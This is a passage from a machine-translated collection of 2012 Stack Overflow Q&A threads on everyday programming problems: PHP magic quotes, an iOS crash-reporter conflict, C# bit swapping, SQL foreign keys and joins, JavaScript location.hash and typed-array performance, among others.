$status = $this->_im->annotateImage($this->_draw, 0, 0, $options['angle'], $text); 
```

谁能帮我？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:41:19.170

这很可能是由[`magic_quotes_gpc`](http://php.net/magic_quotes). 您可以使用以下方法删除转义的引号[`stripslashes`](http://php.net/stripslashes)：

```
$status = $this->_im->annotateImage(
    $this->_draw, 
    0,
    0,
    $options['angle'], 
    stripslashes($text)
); 
```

如果您愿意，您*可以*重新配置您的服务器以禁用魔术引号，但如果您在现有网站上工作，我不一定会建议您这样做，直到您完全理解这样做的含义并对您安全清理任何网站的能力充满信心您在数据库查询中使用的数据。

# ios - PLCrashReporter ios6 崩溃

> ID：13328627
> 
> 赞同：0
> 
> 时间：2012-11-11T04:37:43.640
> 
> 标签：ios, ios6, plcrashreporter

我的 iOS6 应用程序在发布模式下编译和运行时崩溃，请参阅下面的崩溃报告：

```
Incident Identifier: 0267EA79-BAAB-4559-90FB-9ED8C268EB19
CrashReporter Key:   7b2d29f7c42065db47d89a8b3ae1056cf45f7d95
Hardware Model:      iPhone5,2
Process:         Instant Santa [5814]
Path:            /var/mobile/Applications/B303BD19-177E-4DBB-A7C2-89BBF3331818/Instant Santa.app/Instant Santa
Identifier:      Instant Santa
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2012-11-10 22:30:34.889 -0600
OS Version:      iOS 6.0.1 (10A525)
Report Version:  104

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x0000000000000000, 0x0000000000000000
Crashed Thread:  0

Last Exception Backtrace:
0   CoreFoundation                  0x3a6eb3e2 __exceptionPreprocess + 158
1   libobjc.A.dylib                 0x3974495e objc_exception_throw + 26
2   CoreFoundation                  0x3a6eb302 +[NSException raise:format:] + 102
3   Instant Santa                   0x001196aa -[PLCrashReporter enableCrashReporterAndReturnError:] + 82
4   Instant Santa                   0x000b1064 -[BWQuincyManager init] (BWQuincyManager.m:182)
5   Instant Santa                   0x000b0c00 __38+[BWQuincyManager sharedQuincyManager]_block_invoke_0 (BWQuincyManager.m:107)
6   libdispatch.dylib               0x334d35d6 _dispatch_client_callout + 18
7   libdispatch.dylib               0x334d4586 dispatch_once_f + 42
8   Instant Santa                   0x000b0bc0 +[BWQuincyManager sharedQuincyManager] (once.h:68)
9   Instant Santa                   0x0009f9a2 -[AppDelegate application:didFinishLaunchingWithOptions:] (AppDelegate.m:51)
10  UIKit                           0x33f5ba74 -[UIApplication _handleDelegateCallbacksWithOptions:isSuspended:restoreState:] + 248
11  UIKit                           0x33f5b5f8 -[UIApplication _callInitializationDelegatesForURL:payload:suspended:] + 1164
12  UIKit                           0x33f53806 -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] + 694
13  UIKit                           0x33efbcea -[UIApplication handleEvent:withNewEvent:] + 1006
14  UIKit                           0x33efb778 -[UIApplication sendEvent:] + 68
15  UIKit                           0x33efb1ba _UIApplicationHandleEvent + 6194
16  GraphicsServices                0x3a78f5f2 _PurpleEventCallback + 586
17  GraphicsServices                0x3a78f222 PurpleEventCallback + 30
18  CoreFoundation                  0x3a6c03e2 __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 30
19  CoreFoundation                  0x3a6c0386 __CFRunLoopDoSource1 + 134
20  CoreFoundation                  0x3a6bf20a __CFRunLoopRun + 1378
21  CoreFoundation                  0x3a632238 CFRunLoopRunSpecific + 352
22  CoreFoundation                  0x3a6320c4 CFRunLoopRunInMode + 100
23  UIKit                           0x33f52440 -[UIApplication _run] + 664
24  UIKit                           0x33f4f28c UIApplicationMain + 1116
25  Instant Santa                   0x0009f73e main (main.m:16)
26  Instant Santa                   0x0009f6f4 start + 36

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   libsystem_kernel.dylib          0x3a455350 __pthread_kill + 8
1   libsystem_c.dylib               0x339edfb2 pthread_kill + 54
2   libsystem_c.dylib               0x33a2a366 abort + 90
3   Instant Santa                   0x00119912 uncaught_exception_handler + 22
4   CoreFoundation                  0x3a6eb6cc __handleUncaughtException + 624
5   libobjc.A.dylib                 0x39744a46 _objc_terminate() + 126
6   libc++abi.dylib                 0x33ae3118 safe_handler_caller(void (*)()) + 76
7   libc++abi.dylib                 0x33ae31b0 std::terminate() + 16
8   libc++abi.dylib                 0x33ae459a __cxa_throw + 118
9   libobjc.A.dylib                 0x3974499e objc_exception_throw + 90
10  CoreFoundation                  0x3a6eb302 +[NSException raise:format:] + 102
11  Instant Santa                   0x001196aa -[PLCrashReporter enableCrashReporterAndReturnError:] + 82
12  Instant Santa                   0x000b1064 -[BWQuincyManager init] (BWQuincyManager.m:182)
13  Instant Santa                   0x000b0c00 __38+[BWQuincyManager sharedQuincyManager]_block_invoke_0 (BWQuincyManager.m:107)
14  libdispatch.dylib               0x334d35d8 _dispatch_client_callout + 20
15  libdispatch.dylib               0x334d4586 dispatch_once_f + 42
16  Instant Santa                   0x000b0bc0 +[BWQuincyManager sharedQuincyManager] (once.h:68)
17  Instant Santa                   0x0009f9a2 -[AppDelegate application:didFinishLaunchingWithOptions:] (AppDelegate.m:51)
18  UIKit                           0x33f5ba74 -[UIApplication _handleDelegateCallbacksWithOptions:isSuspended:restoreState:] + 248
19  UIKit                           0x33f5b5f8 -[UIApplication _callInitializationDelegatesForURL:payload:suspended:] + 1164
20  UIKit                           0x33f53806 -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] + 694
21  UIKit                           0x33efbcea -[UIApplication handleEvent:withNewEvent:] + 1006
22  UIKit                           0x33efb778 -[UIApplication sendEvent:] + 68
23  UIKit                           0x33efb1ba _UIApplicationHandleEvent + 6194
24  GraphicsServices                0x3a78f5f4 _PurpleEventCallback + 588
25  GraphicsServices                0x3a78f222 PurpleEventCallback + 30
26  CoreFoundation                  0x3a6c03e4 __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ + 32
27  CoreFoundation                  0x3a6c0386 __CFRunLoopDoSource1 + 134
28  CoreFoundation                  0x3a6bf20a __CFRunLoopRun + 1378
29  CoreFoundation                  0x3a632238 CFRunLoopRunSpecific + 352
30  CoreFoundation                  0x3a6320c4 CFRunLoopRunInMode + 100
31  UIKit                           0x33f52440 -[UIApplication _run] + 664
32  UIKit                           0x33f4f28c UIApplicationMain + 1116
33  Instant Santa                   0x0009f73e main (main.m:16)
34  Instant Santa                   0x0009f6f4 start + 36 
```

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T13:26:58.953

如果 PLCrashReporter 在 QuincyKit 初始化之前已经初始化，就会发生这种情况。您是自己初始化 PLCrashReporter，还是安装了其他使用 PLCrashReporter 的框架？

这是引发并导致崩溃的异常：[https ://github.com/bitstadium/PLCrashReporter/blob/master/Source/PLCrashReporter.m#L296](https://github.com/bitstadium/PLCrashReporter/blob/master/Source/PLCrashReporter.m#L296)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T18:30:29.740

没关系，您不需要带有新 HockeySDK 的 CrashReporter.framework，请参见此处：http: [//support.hockeyapp.net/kb/client-integration/migrate-from-hockeykit-quincykit-to-hockeysdk-for-ios](http://support.hockeyapp.net/kb/client-integration/migrate-from-hockeykit-quincykit-to-hockeysdk-for-ios)

# c# - 有没有一种简单的方法来交换位的值？

> ID：13328636
> 
> 赞同：0
> 
> 时间：2012-11-11T04:41:07.820
> 
> 标签：c#, bit-manipulation

我有一个 16 位整数，我正在尝试交换一些单独的位组件的值。

例如：

> *   交换第 3 位和第 4 位的值。
> *   交换第 5 位和第 6 位的值。

我还必须处理更复杂的价值转移链。

> *   将第 2 位的值移动到第 3 位
> *   将第 3 位的值移动到第 1 位
> *   将第 1 位的值移动到第 4 位
> *   将第 4 位的值移动到第 2 位。

有没有明智的方法来做到这一点？这些位并不总是相邻的，因此旋转似乎不是特别可行。现在，我能想到的就是逐位重建 int （通过连续的 &s + >>s），但这似乎并不是特别有效。

我现在有这个：

```
 // bit 2 to bit 3
            temp_shape = 0;
            temp_shape = l_shape & NegXFace;
            temp_shape >>= 1;
            resultShape |= temp_shape;
            // bit 3 to bit 1
            temp_shape = 0;
            temp_shape = l_shape & PosYFace;
            temp_shape <<= 2;
            resultShape |= temp_shape;
            // bit 1 to bit 4
            temp_shape = 0;
            temp_shape = l_shape & PosXFace;
            temp_shape >>= 2;
            resultShape |= temp_shape;
            // bit 4 to bit 2
            temp_shape = 0;
            temp_shape = l_shape & PosYFace;
            temp_shape <<= 2;
            resultShape |= temp_shape;
            // bits 5 and 6
            temp_shape = 0;
            temp_shape = l_shape & (PosZFace | NegZFace);
            resultShape |= temp_shape; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:10:06.177

好吧，您可以检查这些位是否相同，如果它们相同则什么也不做。如果它们不同，您可以通过适当的位掩码异或来同时翻转它们（例如，0001100 表示第 3 位和第 4 位）。我不确定这最终会变得多么“有效”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T08:04:59.860

假设：

```
[Flags]
public enum MyBits
{ 
    Bit1 = 0x01,
    Bit2 = 0x02,
    Bit3 = 0x04,
    Bit4 = 0x08,
    Bit5 = 0x10,
    Bit6 = 0x20
} 
```

然后：

```
public MyBits SwitchBits(MyBits oldBits)
{
    // Extracting every bits
    bool Bit1 = oldBits.HasFlag(MyBits.Bit1);
    bool Bit2 = oldBits.HasFlag(MyBits.Bit2);
    bool Bit3 = oldBits.HasFlag(MyBits.Bit3);
    bool Bit4 = oldBits.HasFlag(MyBits.Bit4);
    bool Bit5 = oldBits.HasFlag(MyBits.Bit5);
    bool Bit6 = oldBits.HasFlag(MyBits.Bit6);

    MyBits newBits = new MyBits();

    // Scrambling the bits
    if (Bit4) newBits = newBits | MyBits.Bit1;
    if (Bit2) newBits = newBits | MyBits.Bit2;
    if (Bit3) newBits = newBits | MyBits.Bit3;
    if (Bit1) newBits = newBits | MyBits.Bit4;
    if (Bit6) newBits = newBits | MyBits.Bit5;
    if (Bit5) newBits = newBits | MyBits.Bit6;

    return newBits ;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T19:05:30.190

此函数可以轻松交换数字 n 的位位置 pos1 和 pos2。首先它检查这两个位是否不同，如果不同，则从 1 切换到 0 或从 0 切换到 1，如果相同，则什么也不做，只返回该数字

```
int swap_bit(int n, int pos1, pos2)
{
 ((n >> pos1) & 1 ) != ( (n >> pos2) & 1 ) ? n = n ^ (( 1 << pos1) |( 1 << pos2)):n;

return n;  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T06:34:58.393

虽然其他答案很有用，但如果您需要按顺序执行多个位交换操作，则提供的方法都不起作用。

一旦你已经移动了位，就几乎不可能知道哪些位从哪里开始，除非你想为每个可能的位交换排列编写逻辑。

相反，您需要一种适用于相对位置（最初是第 2 位的位位置）而不是绝对位置（第 2 位）的方法。

这是我的做法：

```
bool[] relFaces = new bool[6];
        bool swapBool;

        //start relFaces with the absolute faces.
        //default value of bool is "FALSE"
        if((l_shape & PosXFace) == PosXFace)
        {
            relFaces[0] = true;
        }
        if((l_shape & NegXFace) == NegXFace)
        {
            relFaces[1] = true;
        }
        if((l_shape & PosYFace) == PosYFace)
        {
            relFaces[2] = true;
        }
        if((l_shape & NegYFace) == NegYFace)
        {
            relFaces[3] = true;
        }
        if((l_shape & PosZFace) == PosZFace)
        {
            relFaces[4] = true;
        }
        if((l_shape & NegZFace) == NegZFace)
        {
            relFaces[5] = true;
        }

            // -z >> -x
            swapBool = relFaces[1];
            relFaces[1] = relFaces[5];
            // +x >> -z
            relFaces[5] = relFaces[0];
            // +z >> +X
            relFaces[0] = relFaces[4];
            // -X >> +z
            relFaces[4] = swapBool;
            break; 
```

这段代码的优点是一目了然更容易理解，而且你不必对你不感兴趣的位做进一步的操作。最后，如前所述，此代码将适用于连续位交换的任意链，改变相对朝向（在您的情况下），同时也保持绝对朝向。

`l_shape`请注意，一旦完成交换位，您将不得不重建。

# database - 创建时是否需要填充外键？

> ID：13328640
> 
> 赞同：0
> 
> 时间：2012-11-11T04:41:50.433
> 
> 标签：database, oracle, oracle11g, foreign-keys

在 SQL 开发人员中创建外键时，我是否需要将相同的数据放入第二个表中使用的外键中？

例如：

```
Table 1 - Driver
PK - Driver_ID
FK - REG
Name
address
telephone number

Table 2 - Vehicles
PK - REG
make
model
colour
year 
```

创建数据库时，是否需要将车辆表中的 Reg 数据放入驱动程序表中的 Reg 中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:44:46.767

不，不是在创建数据库时。

仅当引用表行中的条目引用它时，才需要存在外键。

例子：

还行吧：

```
INSERT INTO Driver (REG, Name, address, telephone number) 
VALUES (NULL, "John Doe", 1 The Road", "12345678") 
```

但为了做到这一点：

```
INSERT INTO Driver (REG, Name, address, telephone number) 
VALUES (1, "John Doe", 1 The Road", "12345678") 
```

PK = 1 的条目必须存在于车辆表中，

```
Vehicles
1    Ford    Spirit   Blue    1990 
```

# java - JList：缩放行以适应 JFrame 的宽度

> ID：13328646
> 
> 赞同：0
> 
> 时间：2012-11-11T04:43:17.847
> 
> 标签：java, swing, scale, jlist

`JList`我在`JFram`e 处插入了a `BorderLayout.CENTER`，但无法让行填充`JFrame`. 现在，行左对齐并且太小而无法填充整个宽度。`JPanel`在另一个`LayoutManager`帮助下将列表放在 a中吗？

# javascript - 设置 location.hash 时防止默认行为

> ID：13328647
> 
> 赞同：3
> 
> 时间：2012-11-11T04:43:20.210
> 
> 标签：javascript

当我这样做时，

```
location.hash = "test" 
```

url 被更新，页面位于具有该 id 的元素上。

有没有办法阻止页面归位到该元素？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:17:22.657

## 解决方案

你无法阻止这种行为，但你可以通过暂时隐藏目标来欺骗它，例如。像那样（它与jQuery无关）：

```
// obtain "target" DOM (not jQuery) element and do this:
var original_id = target.id; // save original ID
target.id = null; // set target's ID
location.hash = 'test'; // issue location.hash change
target.id = original_id; // set ID to original value 
```

## 广义解决方案

或更一般的例子：

```
// make target_hash set to a hash you want to not lead you to page section and:
var element = document.getElementById(target_hash); // find element by ID
var original_id = element.id; // save original ID
location.hash = target_hash; // previously defined by you (eg. 'test')
element.id = original_id; // reset ID 
```

## 演示/证明

现场示例如下，在通过 jQuery 附加的事件处理程序中（此处演示：http: [//jsfiddle.net/DaZfH/](http://jsfiddle.net/DaZfH/)）：

```
some_link.on('click', function(event){
    event.preventDefault();
    var target = document.getElementById('target');
    var original_id = target.id;
    target.id = null; // unset ID
    location.hash = 'target';
    target.id = original_id;
}); 
```

## 免责声明

但确实其他人是正确的：将您移动到文档中的正确位置是正确的行为。如果您正在做我提到的事情，那么您的解决方案就很不自然，而且肯定有更好的方法来做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-19T15:01:14.777

> 有没有办法阻止页面归位到该元素

是的。尽管 hashchange 事件不可取消，但您可以像这样重置其不需要的行为。

```
var popY,
    popX;

//When location.hash is changed, popstate is the first event to fire 
//Use this event to record current state

window.addEventListener('popstate', popstateHandler);
function popstateHandler() {
  popY = window.scrollY;
  popX = window.scrollX;
}

//Reset scroll position with recorded values when hashchange fires (after page is scrolled)

window.addEventListener('hashchange', hashchangeHandler);
function hashchangeHandler() {
  window.scrollTo(popX, popY);
}
```

这就是它的基础。您可能想为 IE 做一些校对，并实现您这样做的原因：动画滚动、激活某些东西等。

用于 scrollY、scrollX 的 Polyfill：

```
if(!('scrollY' in window)) {
    Object.defineProperty(window, 'scrollY', {
        get: function () {
            return window.pageYOffset
        }
    });
    Object.defineProperty(window, 'scrollX', {
        get: function () {
            return window.pageXOffset
        }
    })
}
```

# java - 对象上带有 getter 和 setter 的 Java nullPointerException

> ID：13328649
> 
> 赞同：0
> 
> 时间：2012-11-11T04:43:33.463
> 
> 标签：java, nullpointerexception

我在下面得到一个 nullPointerException 。有人可以解释为什么吗？谢谢！

```
private SpatialPooler spatialPooler;
private Region        region;
private Column        column33;

public void setUp()
{
    this.spatialPooler = new SpatialPooler();

    this.region = new Region(30, 40, 6, 8, 1.0f, 1, 1);

    this.column33 = this.region.getColumn(3, 3);
}

public void addActiveColumn(Column activeColumn)
{
    this.activeColumns.add(activeColumn); // nullPointerException here!
}

public Column getActiveColumn(int x, int y)
{
    for (Column activeColumn : this.activeColumns)
    {
        if (activeColumn.getX() == x && activeColumn.getY() == y)
        {
            return activeColumn;
        }
    }
    return null;
}

// in a test class that is in the same package.
public void testGetAndAddActiveColumn()
{
    this.spatialPooler.addActiveColumn(this.column33);
    assertNull(this.spatialPooler.getActiveColumn(3, 3));

    this.column33.setActiveState(true);
    assertEquals(this.column33, this.spatialPooler.getActiveColumn(3, 3));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:12:40.967

您的代码没有显示`activeColumns`在任何地方被初始化。

如果它是*Column*对象的列表，则应将此代码放在某处：

```
List<Column> activeColumns = new ArrayList<Column>(); 
```

您可以将它放在构造函数中，或者在声明时使用上面的代码`activeColumns`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:48:24.863

`NullPointerException`s 主要是因为您使用的是未初始化的变量。我假设 activeColumns 尚未初始化。它不是成员，因此它在该功能内没有范围。你可以通过几种方式修复它

1) 局部变量

2）添加activeColumns作为成员

3) 改变函数的行为

# javascript - jQuery查看下一个元素（不是兄弟）是否存在

> ID：13328651
> 
> 赞同：1
> 
> 时间：2012-11-11T04:43:55.693
> 
> 标签：javascript, jquery, html

这是我的 HTML 代码：

```
<select class="grid_3 required jobData valid" id="clli" name="clli" style="font-size: 10px; border: none;">
<option value="0">Select One...</option>
    <option value="905"></option>
    <option value="931">0</option>
    <option value="1">ABRDMSES</option>
</select>
<img alt="This data has been changed!" title="This data has been changed!" src="images/caution.png">
<img alt="This data has been changed!" title="This data has been changed!" src="images/caution.png">
<img alt="This data has been changed!" title="This data has been changed!" src="images/caution.png">
<select class="grid_3 required jobData" id="job_status" name="job_status" style="font-size: 10px; border: none;">
<option value="0">Select One...</option>
</select> 
```

当 a发生时，我会在它旁边`$('.jobData').change();`拍一张**警告图像，以警告用户有要保存的更改。**但是，如果他们对同一个元素进行了多次更改，我首先想看看那里是否已经有一个**警告图像**，然后再发送一个新图像。关于如何确定下一个（但不是`$.next()`）元素的任何理论/方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:51:51.130

您只能用于`$().one`触发处理程序一次。这样你就不需要检查了。

```
$('select').one('change', function(e) {  }); 
```

如果选择器的结果集中有多个选择，则将对其应用一个，并且一旦您需要在每次选择后显示图像，它就会非常适合这里。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:50:28.187

我建议用 div 标签包装警告图像，并计算那里的图像标签。

例如，

```
<div id="cautions">
    <img src="caution.png" />
</div> 
```

在js中

```
if($('#cautions img').length) != 0)
    // insert image 
```

# php - 可以将 jQuery 添加到 php 邮件功能

> ID：13328656
> 
> 赞同：0
> 
> 时间：2012-11-11T04:44:59.810
> 
> 标签：php, javascript, jquery

我正在使用`mail()`in php 并想知道是否可以包含事件侦听器。下面包括带有一个按钮的代码，当单击该按钮时，该段落会向上滑动。然而，什么也没有发生。

```
<html>
    <head>
        <script type="text/javascript"src="js/jquery.js"></script>
        <script type="text/javascript" src="js/jquery-ui.js"></script>
        <script type='text/javascript'>
            $(function() {
                $(':button').click(function(){
                    $("p").slideToggle();   
                });
            });
        </script>
    </head>
    <body>
        <?php
            $to = "Example@yahoo.com"; 
            $subject = "Maybe so??"; 
            $body = "<p>Yeppir </p>
            <button>Click Me </button>"; 
            $headers  = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

            $headers .= 'From: skywalker@msn.com';
            if (mail($to, $subject, $body, $headers)) { 
                echo("<p>Message sent!</p>"); 
            } else { 
                echo("<p>Message delivery failed...</p>"); 
            } 
        ?> 
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:52:20.743

简短的回答是你不能。邮件客户端剥离 JS

只需坚持适用于大多数邮件客户端的纯 HTML 和 CSS。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T04:52:30.740

您正在尝试发送电子邮件，而您的 javascript 在您的网站上。当他们打开消息时，他们会看到该消息，但不会得到任何 javascript，因为您一开始没有将它包含在消息中。

您可以做的是修复您的代码以在消息中与正文一起发送 jQuery。从理论上讲，这是可行的。实际上，这也行不通，因为大约 99% 的电子邮件服务（100% 的所有最常用的）都会剥离 javascript 标签，因为它们可能是恶意的。因此，与其花时间在电子邮件中进行切换，不如花时间尝试让用户访问您的网站。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T04:52:18.020

jQuery 是客户端语言，PHP 是服务器端，实现这一点的可能方法是通过使用 jQuery（使用 Ajax）请求具有邮件功能的 PHP 页面，然后更改 html 以显示/隐藏结果（错误或成功）在 PHP 响应时。

在这篇文章中阅读有关此主题的更多信息[jQuery/PHP mail send the easy way？](https://stackoverflow.com/questions/5051772/jquery-php-mail-send-the-easy-way)

# javascript - JavaScript 中类型化数组的优点是它们在 C 中的工作方式相同还是相似？

> ID：13328658
> 
> 赞同：28
> 
> 时间：2012-11-11T04:45:18.170
> 
> 标签：javascript, c, arrays, memory, typed-arrays

我一直在玩 JavaScript 中的[类型化数组](https://developer.mozilla.org/en-US/docs/JavaScript_typed_arrays)。

```
var buffer = new ArrayBuffer(16);
var int32View = new Int32Array(buffer); 
```

我想普通数组（`[1, 257, true])`在 JavaScript 中性能很差，因为它们的值可以是任何类型，因此，达到内存中的偏移量并非易事。

我最初认为 JavaScript 数组下标与对象的工作方式相同（因为它们有很多相似之处），并且是基于[哈希映射](http://en.wikipedia.org/wiki/Hash_table)的，需要基于哈希的查找。但我还没有找到太多可信的信息来证实这一点。

所以，我认为类型化数组表现如此出色的原因是因为它们像 C 中的普通数组一样工作，它们总是被类型化的。给定上面的初始代码示例，并希望获得类型化数组中的第 10 个值...

```
var value = int32View[10]; 
```

*   类型是`Int32`，因此每个值必须由`32`位或`4`字节组成。
*   下标是`10`。
*   所以该值在内存中的位置是`<array offset> + (4 * 10)`，然后读取`4`字节以获得总值。

我基本上只是想确认我的假设。我对此的想法是否正确，如果不是，请详细说明。

我查看了[V8 源代码](https://github.com/v8/v8)，看看我是否可以自己回答，但我的 C 生锈了，而且我对 C++ 不太熟悉。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-11-11T20:06:06.647

Typed Arrays were designed by the WebGL standards committee, for performance reasons. Typically Javascript arrays are generic and can hold objects, other arrays and so on - and the elements are not necessarily sequential in memory, like they would be in C. WebGL requires buffers to be sequential in memory, because that's how the underlying C API expects them. If Typed Arrays are not used, passing an ordinary array to a WebGL function requires a lot of work: each element must be inspected, the type checked, and if it's the right thing (e.g. a float) then copy it out to a separate sequential C-like buffer, then pass that sequential buffer to the C API. Ouch - lots of work! For performance-sensitive WebGL applications this could cause a big drop in the framerate.

On the other hand, like you suggest in the question, Typed Arrays use a sequential C-like buffer already in their behind-the-scenes storage. When you write to a typed array, you are indeed assigning to a C-like array behind the scenes. For the purposes of WebGL, this means the buffer can be used directly by the corresponding C API.

Note your memory address calculation isn't quite enough: the browser **must** also bounds-check the array, to prevent out-of-range accesses. This has to happen with any kind of Javascript array, but in many cases clever Javascript engines can omit the check when it can prove the index value is already within bounds (such as looping from 0 to the length of the array). It also has to check the array index is really a number and not a string or something else! But it is in essence like you describe, using C-like addressing.

**BUT...** that's not all! In some cases clever Javascript engines can **also deduce the type of ordinary Javascript arrays**. In an engine like V8, if you make an ordinary Javascript array and only store floats in it, V8 may optimistically decide it's an array of floats and optimise the code it generates for that. The performance can then be equivalent to typed arrays. So typed arrays aren't actually necessary to reach maximum performance: just use arrays predictably (with every element the same type) and some engines can optimise for that as well.

So why do typed arrays still need to exist?

*   Optimisations like deducing the type of arrays is *really complicated*. If V8 deduces an ordinary array has only floats in it, then you store an object in an element, *it has to de-optimise* and regenerate code that makes the array generic again. It's quite an achievement that all this works transparently. Typed Arrays are much simpler: they're guaranteed to be one type, and you just can't store other things like objects in them.
*   Optimisations are never guaranteed to happen; you may store only floats in an ordinary array, but the engine may decide for various reasons not to optimise it.
*   The fact they're much simpler means other less-sophisticated javascript engines can easily implement them. They don't need all the advanced deoptimisation support.
*   Even with really advanced engines, proving optimisations can be used is extremely difficult and can sometimes be impossible. A typed array significantly simplifies the level of proof the engine needs to be able to optimise around it. A value returned from a typed array is certainly of a certain type, and engines can optimise for the result being that type. A value returned from an ordinary array could in theory have any type, and the engine may not be able to prove it will always have the same type result, and therefore generates less efficient code. Therefore code around a typed array is more easily optimised.
*   Typed arrays remove the opportunity to make a mistake. You just can't accidentally store an object and suddenly get far worse performance.

So, in short, ordinary arrays can in theory be equally fast as typed arrays. But typed arrays make it much easier to reach peak performance.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-11T19:17:52.233

是的，你基本上是正确的。对于标准的 JavaScript 数组，JavaScript 引擎必须假定数组中的数据都是对象。它仍然可以将其存储为类似 C 的数组/向量，其中对内存的访问仍然像您描述的那样。问题是数据不是值，而是引用该值（对象）的东西。

因此，执行`a[i] = b[i] + 2`要求引擎：

1.  访问 b 中索引 i 处的对象；
2.  检查对象是什么类型；
3.  从对象中提取值；
4.  将值加 2；
5.  使用 4 的新计算值创建一个新对象；
6.  将步骤 5 中的新对象分配到索引 i 处的 a。

使用类型化数组，引擎可以：

1.  访问 b 中索引 i 处的值（包括将其放入 CPU 寄存器中）；
2.  将值增加 2；
3.  将步骤 2 中的新对象分配给索引 i 处的 a。

注意：这些不是 JavaScript 引擎将执行的确切步骤，因为这取决于正在编译的代码（包括周围的代码）和相关的引擎。

这使得结果计算更加高效。此外，类型化数组具有内存布局保证（n 字节值的数组），因此可用于直接与数据（音频、视频等）交互。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-10-01T14:36:29.660

When it comes to performance, things can change fast. As AshleysBrain says, it comes down to whether the VM can deduce that a normal array can be implemented as a typed array quickly and accurately. That depends on the particular optimizations of the particular JavaScript VM, and it can change in any new browser version.

[This Chrome developer comment](http://code.google.com/p/v8/issues/detail?id=2190) provides some guidance that worked as of June 2012:

1.  Normal arrays can be as fast as typed arrays if you do a lot of sequential access. Random access outside the bounds of the array causes the array to grow.
2.  Typed arrays are fast for access, but slow to be allocated. If you create temporary arrays frequently, avoid typed arrays. (Fixing this is possible, but it's low priority.)
3.  Micro-benchmarks such as JSPerf are not reliable for real-world performance.

If I might elaborate on the last point, I've seen this phenomenon with Java for years. When you test the speed of a small piece of code by running it over and over again in isolation, the VM optimizes the heck out of it. It makes optimizations which only make sense for that specific test. Your benchmark can get a hundredfold speed improvement compared to running the same code inside another program, or compared to running it immediately after running several different tests that optimize the same code differently.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-11T05:57:49.790

我并不是任何 javascript 引擎的真正贡献者，只是在 v8 上读过一些资料，所以我的回答可能并不完全正确：

数组中的值（只有没有孔/间隙的普通数组，不是稀疏的。稀疏数组被视为对象。）都是指针或具有固定长度的数字（在 v8 中它们是 32 位，如果是 31 位整数，则它最后用一点标记`0`，否则它是一个指针）。

所以我认为查找内存位置与 typedArray 没有什么不同，因为整个数组的字节数都是相同的。但不同之处在于，如果它是一个对象，那么您必须添加一个拆箱层，这对于普通的 typedArrays 不会发生。

当然，在访问 typedArrays 时，绝对没有普通数组所具有的类型检查（尽管这可能会在高度优化的代码中被删除，它只为热代码生成）。

对于写作，如果是相同的类型，应该不会慢很多。如果它是不同的类型，那么 JS 引擎可能会为其生成多态代码，这会更慢。

您也可以尝试在 jsperf.com 上进行一些基准测试以确认。

# sql-server-2005 - 从不同的表中添加值

> ID：13328659
> 
> 赞同：1
> 
> 时间：2012-11-11T04:45:20.667
> 
> 标签：sql-server-2005

朋友们，我有这些桌子：

```
Contestant Table:
Winner
Peter

Group Table:
Id Name Score Union
1 Bryan 3 77
2 Mary 1 20
3 Peter 5 77
4 Joseph 2 25
5 John 6 77 
```

我想在小组表上给彼得加 5 分。所以，我想出了这个查询。

```
UPDATE Group 
SET Score = Score+5
FROM Contestant, Group 
WHERE Contestant.Winner = Group.Name 
```

现在，我还想给与彼得相同的联盟 5 分，即 77 分。

如何将它作为一个查询集成到我现有的查询中？

//更新1

我有与上述类似的问题，但使用 3 个表：

```
1\. Company (table)
CONAME
COPOINTS

2\. Group_Member (table)
CONAME
NAME

3\. Member (table)
NAME
MPOINTS 
```

我想要一个正确的查询，如下所示，条件如下：

```
Update Member
Set MPOINTS=MPOINTS+5
Where Company.CONAME=Group_Member.CONAME
And
Group_Member.NAME=Member.NAME 
```

你能更正上面的查询吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:52:57.483

```
update u set score = score + 5
from contestant c
inner join group g on g.name = c.winner
inner join group u on u.union = g.union 
```

目前尚不清楚，但如果您希望获胜者获得额外的 5 分：

```
update u set score = (case
  when u.name = c.winner then score + 10
  else then score + 5 end)
from contestant c
inner join group g on g.name = c.winner
inner join group u on u.union = g.union 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:52:58.340

```
UPDATE Group 
SET Score = Score+5
WHERE [Union] = (
    SELECT [Union] 
    FROM Group, Contestant 
    WHERE Group.Name = Contestant.Winner) 
```

# ios - 在没有平移手势的情况下获取平移速度

> ID：13328663
> 
> 赞同：0
> 
